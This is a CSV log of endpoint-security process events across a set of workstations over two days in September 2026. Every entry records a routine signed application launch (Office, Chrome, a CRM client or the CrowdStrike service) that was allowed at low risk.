event_id,timestamp,asset_id,user_id,parent_process,process_name,command_line,sha256,signature_status,edr_action,risk_level
P00001,2026-09-07 06:19:50,WKST-MKT-010,ntinda,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",3792f4d2917474aa9d2cf92d59c6b647a437a78fe36af873044a14bec64be0d0,signed,ALLOWED,Low
P00002,2026-09-07 06:26:53,WKST-CS-017,mhaingura,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",c830e3cefd5025f996f6db00f7cd057ada85b62c44d569775c047adcb94c4371,signed,ALLOWED,Low
P00003,2026-09-07 06:29:43,WKST-TRY-007,hamukwaya,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,bdf6f7d8356d7ca5e768bb52746cd55d429a3279c077663523cce32eead17a93,signed,ALLOWED,Low
P00004,2026-09-07 06:35:28,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",b82df4feab6e94cb5132189efa7a575817a6c9b9878e52ebd9e7060a7370eb48,signed,ALLOWED,Low
P00005,2026-09-07 06:37:36,WKST-CS-017,mhaingura,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",80faaa0656aa17d7a0c14be3a97a0d9c0f51689b090756cfd76f37188ab3ca88,signed,ALLOWED,Low
P00006,2026-09-07 06:41:52,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",366a9ad091cefdfba41517178ada04952f5cda038694323e36bfbd8385cb1845,signed,ALLOWED,Low
P00007,2026-09-07 06:48:03,WKST-MKT-010,ntinda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",209ce3814bbd2b6c5e0b320102e7cd37836fe17d720d86e8faca555898c9e57d,signed,ALLOWED,Low
P00008,2026-09-07 06:48:44,WKST-AUD-004,tjirera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",804f48fd4ae5b76cd2dac58bae57c770a88434b14c8f80cd3183214362f988af,signed,ALLOWED,Low
P00009,2026-09-07 07:01:17,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",c9f30b795ff0cf7baeeeb8713e4005f62d8bc13a50d443b3fd176fdd2d3bee09,signed,ALLOWED,Low
P00010,2026-09-07 07:04:29,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",7044526bf2da23c5f1b677196a6fc80d18d0fd8a6417fcd0156f2f3cbb84eb80,signed,ALLOWED,Low
P00011,2026-09-07 07:12:57,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",54ab1f789f67b99180ba1718b499e51aaafd792ace04c3a65a4a9b94c5cfd14a,signed,ALLOWED,Low
P00012,2026-09-07 07:13:55,WKST-SOC-003,haufiku,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",36945aebc083690e64dd183517d433eb3ed27ed4d8aa0cd128d8a342db229e64,signed,ALLOWED,Low
P00013,2026-09-07 07:27:53,WKST-CS-006,nnakale,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",7cf130ede7d79d9e1203fade748aaccc32e0eb8c6165e068517a17d414ec22b2,signed,ALLOWED,Low
P00014,2026-09-07 07:33:29,WKST-LGL-005,mbandeka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",1a871aec1123f13db8f0ca46ca29b745c7d7eba48c17f1502d9121e8abace090,signed,ALLOWED,Low
P00015,2026-09-07 07:34:25,WKST-CS-011,tkamati,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",9a53401c22abe3d970e52e3a070613eb85668f5bcda7c9fdbc40a5c019c84741,signed,ALLOWED,Low
P00016,2026-09-07 07:37:46,WKST-FIN-004,tshivute,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,f1d56144ecfde33e374245306cdb7c68f972766efd10f792ef5f338ad9eb1aef,signed,ALLOWED,Low
P00017,2026-09-07 07:50:27,WKST-SOC-003,haufiku,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",be3e283433c538769b56fef2919519d267caed44b35ca0571f06e80213394e81,signed,ALLOWED,Low
P00018,2026-09-07 08:13:10,WKST-CS-011,tkamati,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,fa31e62bdefee262bc6debe688410a7f4f469aff2def491ccc7ffd3bd3560e7b,signed,ALLOWED,Low
P00019,2026-09-07 08:30:19,WKST-LGL-005,mbandeka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",a13c978b5f817bfa9b66f8d14f784addf0ab29ce3f1f5aded253fea279bc404c,signed,ALLOWED,Low
P00020,2026-09-07 08:38:25,WKST-IT-012,katjiuongua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,9f0eb57cf13df1ce471fb9dd8a4037dbf21293473a0ae91678fd2960a9111c56,signed,ALLOWED,Low
P00021,2026-09-07 08:39:08,WKST-CMP-003,amupanda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",e9d3ac3e31cb4703af189f056f2e2fe80df1fb7e2f73d24436f835b7054b84b6,signed,ALLOWED,Low
P00022,2026-09-07 08:39:46,WKST-AUD-004,tjirera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",91275abb7b805125484a199428324bc0bdedaca69497151a0578e3e81369c54d,signed,ALLOWED,Low
P00023,2026-09-07 08:44:50,WKST-AUD-004,tjirera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",601aac23b7a8dcceb55ce07b6f6756a55f0acd4927206aae1400fb5369e4658c,signed,ALLOWED,Low
P00024,2026-09-07 09:01:50,WKST-CS-017,mhaingura,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",5d2b72cef8690fc80a6dd4eb6fc3819f9ffca6e438285aa1c08b81244d7a672f,signed,ALLOWED,Low
P00025,2026-09-07 09:03:45,WKST-SWK-002,nduminga,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",990cdaed7bcb282c54f15d372a75318fd9a4576890800a73df135becafde42e2,signed,ALLOWED,Low
P00026,2026-09-07 09:15:35,WKST-SWK-002,nduminga,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",bd9e863dbbdbb97dd3c7a5e20b157135454fb3237242890d678c41c9b0fb275d,signed,ALLOWED,Low
P00027,2026-09-07 09:27:07,WKST-SOC-003,haufiku,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",022cc132873158be4b7b77b5698c65c1518fb31044235ef29da477f00f199d4e,signed,ALLOWED,Low
P00028,2026-09-07 09:28:11,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",31140eecb6cab0780f2cdc343e164cdd8d919a01565849feb87e82998060bc98,signed,ALLOWED,Low
P00029,2026-09-07 09:31:32,WKST-CMP-009,kndjavera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",5f051df8ee2aafb04d93438af5d4a8430036dc2dc8828b56df60f6da5c27e776,signed,ALLOWED,Low
P00030,2026-09-07 09:41:38,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",35beeb3fbb70bba2bf36b3287c45203b173f56c67879da138bfa7158831f52af,signed,ALLOWED,Low
P00031,2026-09-07 09:42:03,WKST-HR-002,pnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,bfc651ed43b43a2ec5491076a430b28028cef8be5140e4b39ba5c30351a19768,signed,ALLOWED,Low
P00032,2026-09-07 09:50:13,WKST-SWK-012,nambala,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,49de21b9d54be390e350d89359ce1b78ea16490165235682db828a46457b0441,signed,ALLOWED,Low
P00033,2026-09-07 10:27:46,WKST-OND-004,ndjaba,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",14de82b2a9db665d228437ac3dc3771398dcebb09f35994302cad87c6c101b94,signed,ALLOWED,Low
P00034,2026-09-07 10:32:43,WKST-FIN-021,jkavari,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,0b77b94a8ce48553a65c3bd8c864c6c4f05480195bb6068f11cdfb51fff79e26,signed,ALLOWED,Low
P00035,2026-09-07 10:45:17,WKST-LOAN-018,shilongo,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,5a5c805befb61f8159675aebf66b5ecb35cffb142fa24e12d1924c98c7d8038b,signed,ALLOWED,Low
P00036,2026-09-07 10:57:24,WKST-TRY-007,hamukwaya,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",4ab67ad5464b86851878b8b8082c873dfdb11cee3fb803d26f47394f1b5fda43,signed,ALLOWED,Low
P00037,2026-09-07 11:08:33,WKST-CMP-003,amupanda,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",ed74463779123592b5b435a78f6476951227532fa3bbd939a2c0158ab33de6c6,signed,ALLOWED,Low
P00038,2026-09-07 11:12:16,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",0efadc0fd21c404ef130cc8d8c29fb26adc61e481db7a126af00c391134fd761,signed,ALLOWED,Low
P00039,2026-09-07 11:25:54,WKST-SWK-012,nambala,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",f897598246e0633f6a0d250988c34a94cacbfb6681e0dd9f734244008c80cac8,signed,ALLOWED,Low
P00040,2026-09-07 11:39:23,WKST-SOC-003,haufiku,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",ce07647e81888b9a171c0af7e8240c05d5afd59b6e451bec613341c837d4ac9d,signed,ALLOWED,Low
P00041,2026-09-07 11:46:41,WKST-SOC-003,haufiku,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,19061e4a76b1a43f920f746aec5932a5f52c3e9d7cc160c51c085214c02f7790,signed,ALLOWED,Low
P00042,2026-09-07 11:56:05,WKST-HR-014,mukwambi,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",71890b43b4418d1ee9627a53c6a730ef795fb12007c4ba16237612ccc21152cd,signed,ALLOWED,Low
P00043,2026-09-07 11:59:44,WKST-HR-014,mukwambi,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",bd9e36342003caa341e2226fb23610f1ffe17815b02fdd03472a3cac83b1f63c,signed,ALLOWED,Low
P00044,2026-09-07 12:02:09,WKST-IT-012,katjiuongua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",7315ff7f443c32af911ec3042e0db3af04012f27d1ea5c924eefb3742bb98fa2,signed,ALLOWED,Low
P00045,2026-09-07 12:06:02,WKST-HR-002,pnakale,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",e2ace1087cc7f9dc1c01f5a494ecccd0d7d671271d240b822cc8f2743ec51a24,signed,ALLOWED,Low
P00046,2026-09-07 12:11:03,WKST-IT-005,nghifindaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",f29febcdc165817455fb58c6a0cdac70f025ba2027ed39a833492d41957d0f25,signed,ALLOWED,Low
P00047,2026-09-07 12:13:34,WKST-SWK-008,sihuhua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,3b249f47cacbb881cdc1f2921322ec0fed126d9a977af2b5fd138381b0954e8a,signed,ALLOWED,Low
P00048,2026-09-07 12:43:22,WKST-IT-005,nghifindaka,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",6925789157d3767139214c4362366ab28139c54fa3f5250aecc357d95d7db52d,signed,ALLOWED,Low
P00049,2026-09-07 13:04:30,WKST-CMP-003,amupanda,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,cb12cb6b80e3c1c0025eed27020df2f4cfe93c6b563a11dbf7aa387a5b49a5bf,signed,ALLOWED,Low
P00050,2026-09-07 13:25:02,WKST-IT-005,nghifindaka,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",8c103cbcea0e6f25489e42acb0ed302e6c2d68ea844a7b890f5ca3f3cefd5403,signed,ALLOWED,Low
P00051,2026-09-07 13:42:07,WKST-HR-014,mukwambi,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",c3226d4c962f8f55b0e566cf9f44e0268508b2d1ee425151034add42649df930,signed,ALLOWED,Low
P00052,2026-09-07 13:51:18,WKST-OND-004,ndjaba,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",252e3db05a679a12c5d266ec14f9fc270d73f295ae926a386b67f9fc365639bb,signed,ALLOWED,Low
P00053,2026-09-07 14:11:18,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",099a028dd5fb17cef7ad65d5794f968d5a90f72c507f2f996e51f272d5ec4562,signed,ALLOWED,Low
P00054,2026-09-07 14:13:12,WKST-PRC-008,sankwasa,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",5335ca37d6d7640d6e902ca7f19c2b156bbe4764b095c5bff533f11d50f3e5d6,signed,ALLOWED,Low
P00055,2026-09-07 14:30:32,WKST-LGL-005,mbandeka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",8c1455501a1fa7d59fb9cbfec553f70b2aaaff4af2ed5b402c2852187f0ecd85,signed,ALLOWED,Low
P00056,2026-09-07 14:35:50,WKST-SOC-003,haufiku,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",2eb6ee7ce7eb968d6d0199723374fddad2ab69f4f240100da7518e9b08c290fa,signed,ALLOWED,Low
P00057,2026-09-07 14:38:05,WKST-FIN-004,tshivute,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",306326112c5d9e4280aab22a00c19a3e54963c859ffd0aa8e65ce3c029993e54,signed,ALLOWED,Low
P00058,2026-09-07 14:38:51,WKST-EXE-002,shapaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",d18781862afcb1ecfa6d4e331e9e60072f8e6a74da57861e4ddc35aca9b6098f,signed,ALLOWED,Low
P00059,2026-09-07 14:38:58,WKST-SWK-012,nambala,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",4ea165c2279b97122921ec985318adbe11b41448b2c83f3794c170e7d12ba075,signed,ALLOWED,Low
P00060,2026-09-07 14:41:57,WKST-OND-004,ndjaba,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",0b47507ade4efe06984eacbdf03619a7adbda2082de97c060c8fd3ec5c9473fa,signed,ALLOWED,Low
P00061,2026-09-07 14:59:52,WKST-OND-004,ndjaba,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",cdf60757fc02ff5e83ff0f98ed49374ed0d720c2d3b4d14f715f0517d7bc264c,signed,ALLOWED,Low
P00062,2026-09-07 15:26:46,WKST-PRC-008,sankwasa,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",8123410c8b4fcc6f56dd5e70a3825db22bf4bb542123d878a7357a6529c58acb,signed,ALLOWED,Low
P00063,2026-09-07 15:34:11,WKST-IT-005,nghifindaka,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",d7b28c8a83cbb925d679d85602b9f10b1df81a323328cbf9e87a09e0d72f55ae,signed,ALLOWED,Low
P00064,2026-09-07 15:48:29,WKST-HR-014,mukwambi,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",500bf8f33dfa5629f18fa7ef28a33898db289cb97886fb72fbd9c2faa2512ebc,signed,ALLOWED,Low
P00065,2026-09-07 16:09:21,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",135ba8290bdc06bc571d3e95beb7e45230ea127fa4137c7867893e944e6ab096,signed,ALLOWED,Low
P00066,2026-09-07 16:11:50,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",deb9018144f5e76f78ddf342d2c757a7cc6ac9b579a113a8aca5beccf29d526c,signed,ALLOWED,Low
P00067,2026-09-07 16:27:49,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",d5e329e4154bf381a026cf5d6206541e74c908fd282cf0eb4b3c17e9a368e3b6,signed,ALLOWED,Low
P00068,2026-09-07 16:35:24,WKST-SWK-002,nduminga,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",894aaa1db124ee965f4a27345112498834ef29a288959411748d111c9d615e96,signed,ALLOWED,Low
P00069,2026-09-07 16:37:25,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",df09c08b15070c1557dc00d8627ed0b32ea90b240df120ebfffa05a6d777b5ea,signed,ALLOWED,Low
P00070,2026-09-07 16:42:05,WKST-CMP-003,amupanda,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",173b0ed64b8e5344a91e77ab5ad5b94d89f198d66b315b323b1322dbdc5cf4e5,signed,ALLOWED,Low
P00071,2026-09-07 16:44:32,WKST-CMP-003,amupanda,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,2dfacbdcababa5d2dfbbf810b3d350feacd2fa1b007dccf4e2fe2a5b0bd9936b,signed,ALLOWED,Low
P00072,2026-09-07 16:50:29,WKST-RSK-006,murorua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",3cb8b4e49d82566a14debd70128c4bccf457f7daec9799aef51c75d64666e812,signed,ALLOWED,Low
P00073,2026-09-07 17:07:16,WKST-LGL-005,mbandeka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",a4b74232baf91f70d02e11b7552c87d36fecc822e150e061180418fc9eaba272,signed,ALLOWED,Low
P00074,2026-09-07 17:22:54,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",dd1b4fd75b38c0d636662a8d40f3dce684ba07943c883c23ebd087db97cf4243,signed,ALLOWED,Low
P00075,2026-09-07 17:23:54,WKST-HR-014,mukwambi,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",6bc1b85d87adbfc9f47e0f80b5ae9c5d18e23e6a211923e8f93650941e7d7d36,signed,ALLOWED,Low
P00076,2026-09-07 17:47:31,WKST-CMP-003,amupanda,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",a2fb1ff0ef5b0de79812d8d874ac0293124fcb96f946ae850f467aa4cef06576,signed,ALLOWED,Low
P00077,2026-09-07 18:09:41,WKST-MKT-010,ntinda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",c5770851c2ae39e39a83cce04d4aa044e18632f5f751cc16a0abfd917ab79422,signed,ALLOWED,Low
P00078,2026-09-07 18:25:55,WKST-LGL-005,mbandeka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,87a95ca138121f9a7b338a5b07690fddc45311406c7815c064519e5d17cafba1,signed,ALLOWED,Low
P00079,2026-09-07 18:30:13,WKST-RSK-006,murorua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",2ae078b87d204df7df5098b3b1ecc56b653fd9afab5739beabab42e6b1cb1fc4,signed,ALLOWED,Low
P00080,2026-09-07 18:46:11,WKST-LGL-005,mbandeka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",6049d8a92a96cefb162f53137ecffb03d529205d751e22359937757ff8803dfa,signed,ALLOWED,Low
P00081,2026-09-07 18:49:08,WKST-RSK-006,murorua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",cdc8f9c2319120644f498faf11af1f620db59914a4059675864cf75e5481ade1,signed,ALLOWED,Low
P00082,2026-09-07 19:15:22,WKST-SWK-008,sihuhua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",ed1af5e83c844bcc0123901c18209d042d4007268a8e5dd91c51ac2d855dc454,signed,ALLOWED,Low
P00083,2026-09-07 19:36:08,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",55f8b82faaf62b7966b1643754f188b0471ad113b340a8251252c41b406e784a,signed,ALLOWED,Low
P00084,2026-09-07 19:53:48,WKST-CMP-009,kndjavera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",7c09054a0c20d7f8f0e0b2ecc06808f9d5c85baa54dfa84416b7f4e9c95318d3,signed,ALLOWED,Low
P00085,2026-09-07 19:55:48,WKST-CS-011,tkamati,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,e74def2cfd500fda8793541382ae2c8d85acffb7c3a68996e7e9290479019c9a,signed,ALLOWED,Low
P00086,2026-09-08 06:00:07,WKST-HR-002,pnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",1e5815648888f5d0f1f5210d3366bd89120ad12482fa1e5f5ad5bc4fd705f7d9,signed,ALLOWED,Low
P00087,2026-09-08 06:12:42,WKST-HR-014,mukwambi,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",a5da44750885c4244ead474b606da2638bc1a959a9fdbbf1acebe4e1bce4bc74,signed,ALLOWED,Low
P00088,2026-09-08 06:13:09,WKST-SWK-008,sihuhua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",aff6e3d1bef5a4fc0a1e50bec4d3e8fef2ee19900639cded7a7de0a4c7044d3d,signed,ALLOWED,Low
P00089,2026-09-08 06:48:59,WKST-CS-011,tkamati,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",c67ed22993db94aa6b3e2b15e5c4f719d54e5d42e641f7668c9437c05e20a4c0,signed,ALLOWED,Low
P00090,2026-09-08 07:09:36,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",4bfe41352cc7ba5cf10083a6a00cb6c1e6d90e2ad9627eb9eb6a1b7ccd5d1317,signed,ALLOWED,Low
P00091,2026-09-08 07:11:17,WKST-CS-006,nnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,5b1f844023ad25f94e5873aae43382adece5c2059dd89ab00284dec497df43f6,signed,ALLOWED,Low
P00092,2026-09-08 07:31:03,WKST-FIN-004,tshivute,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",6b163cfaf95001f8b18be0aa5ec67ebba52c964ae19e0ad7b75f0e2a807f412f,signed,ALLOWED,Low
P00093,2026-09-08 07:34:02,WKST-CMP-003,amupanda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",73f666cc51810560050f6f749693a91fba73a9bea16cf02d9ffcf70943b2615a,signed,ALLOWED,Low
P00094,2026-09-08 07:46:28,WKST-CS-017,mhaingura,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",14e04ffbe7ecf69ab502a9a1776c7dd279a3a20d34886f2e079cb21fa8cbdff5,signed,ALLOWED,Low
P00095,2026-09-08 07:54:09,WKST-CS-017,mhaingura,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",4c5ab8b8b21ccda53b3cf783d73ffd616667e1bb4841961570e911ad2d26050a,signed,ALLOWED,Low
P00096,2026-09-08 08:01:47,WKST-AUD-004,tjirera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",79784bb7fe62b6c3fe1d68251ed0fe2a8143eb37fdd7d71d1137b9d59ede2ef7,signed,ALLOWED,Low
P00097,2026-09-08 08:05:29,WKST-SWK-008,sihuhua,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",bbf3792e989ad9bf41a68bdab0340a79c57fd8b0bd974b657a83d24784ff9010,signed,ALLOWED,Low
P00098,2026-09-08 08:08:09,WKST-SWK-002,nduminga,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",3f4eb0d0807bca8e3a860ebeaf94d89da3c2788d8b07a45d85fd537605b70252,signed,ALLOWED,Low
P00099,2026-09-08 08:37:16,WKST-LGL-005,mbandeka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",dcde30ed5557393192e215a65919bfb7acd1e90fbf3feae1dcb644ec53daab31,signed,ALLOWED,Low
P00100,2026-09-08 08:52:09,WKST-EXE-002,shapaka,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",720cd440b137a8bc8c70fffc61c221121d8867b7f082e76d57cd9c4a56d4e3e1,signed,ALLOWED,Low
P00101,2026-09-08 09:12:06,WKST-SOC-003,haufiku,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",ee08e0ad9f5a2daa7bfae217283e1f4b1d030a7b1fba18bc14ae7227abfac377,signed,ALLOWED,Low
P00102,2026-09-08 09:30:17,WKST-PRC-008,sankwasa,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",ba4da8cf53c1363a48ce3514079eee5156fafdf56c08b5e67cc0da4153f4cd5d,signed,ALLOWED,Low
P00103,2026-09-08 09:33:11,WKST-CS-006,nnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",7067835d893e7d0d3bae6777c5a977735330a0925da250e3d47e7ebb32648c8e,signed,ALLOWED,Low
P00104,2026-09-08 09:35:35,WKST-LOAN-018,shilongo,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",68065e758794099a57f43f2aaf7b17277a73b24b233d70dc649037ac0b259343,signed,ALLOWED,Low
P00105,2026-09-08 09:40:35,WKST-CS-011,tkamati,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",545095e6014b033a4e5440797b8b9eda28e71ab57f652ccd763e231e4e7c6462,signed,ALLOWED,Low
P00106,2026-09-08 09:43:23,WKST-HR-014,mukwambi,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",8a5e3a6c239ec56b63144ea9aee12236a9883a68950502638e82e2e7cdc56db9,signed,ALLOWED,Low
P00107,2026-09-08 09:51:26,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",17ff8898319c4718a617ce058323793981776393830c464cfb82a95df433d12b,signed,ALLOWED,Low
P00108,2026-09-08 10:20:22,WKST-CS-006,nnakale,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",d1586696d71d3bcbdd4087f072c322a85e4926021c951dfc1f39add3dfc21a15,signed,ALLOWED,Low
P00109,2026-09-08 10:25:12,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",42d40d4f79de7bb1e4ebb17176a62b5bd60b7a67e508ecd0c0312063a8e999cb,signed,ALLOWED,Low
P00110,2026-09-08 10:42:56,WKST-LGL-005,mbandeka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,13295eb7d824ad4bedb31d89fad9340e19a6d5305b2988f68509937a7f3f6104,signed,ALLOWED,Low
P00111,2026-09-08 10:56:23,WKST-LGL-005,mbandeka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,fec923a113f68eaa06d662970542a0f70a2aedbd33ba511e4e7a4d177705fd2f,signed,ALLOWED,Low
P00112,2026-09-08 11:10:46,WKST-OND-004,ndjaba,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,ca399ddf6545d4e5f1c0fd55de636b01a73ebf73f642e1a2dd76aca804485598,signed,ALLOWED,Low
